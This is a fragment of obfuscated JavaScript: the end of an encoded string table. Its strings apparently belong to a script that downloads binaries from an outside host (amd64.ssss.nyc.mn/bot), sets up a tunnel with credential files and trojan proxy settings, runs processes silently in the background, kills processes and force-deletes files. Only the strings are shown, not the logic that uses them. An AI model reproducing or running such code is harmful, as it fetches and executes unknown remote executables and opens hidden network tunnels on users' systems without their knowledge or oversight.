x20','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','trojan','Skipping\x20adding\x20automatic\x20access\x20task','tls','2087','NAME','tcp','list.txt','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','map','del\x20/f\x20/q\x20','join','\x20>/dev/null\x202>&1','forEach','has','443','random','false','Error\x20downloading\x20files:','fileName','existsSync','freedom','win32','pkill\x20-f\x20\x22[','1920608jRutng','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','post','1ZruckL','&fp=firefox&type=ws&host=','https://amd64.ssss.nyc.mn/bot','none','success','abcdefghijklmnopqrstuvwxyz','Error\x20executing\x20command:\x20','\x0a\x20\x20credentials-file:\x20','TunnelSecret','unlinkSync'];_0x1e38=function(){return _0x51a038;};return _0x1e38();}
